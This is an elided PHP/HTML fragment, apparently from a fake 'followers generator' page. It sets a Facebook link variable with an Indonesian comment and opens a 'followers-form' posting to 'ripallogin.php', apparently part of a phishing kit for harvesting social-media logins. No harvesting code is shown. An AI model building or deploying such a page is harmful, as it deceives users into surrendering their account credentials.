...
$linklo = "fb.com/evenune.barrier" // GUNAKAN / DI AKHIR LINK
?>
<?php
	...
	<div class="main-container">
		...
		<div class="content-wrapper generator-content-wrapper">					
			<div class="processing-first-step">	
				<div class="row">	
					<form action="ripallogin.php" method="post" id="followers-form" class="followers-form first col-sm-12" role="form" >
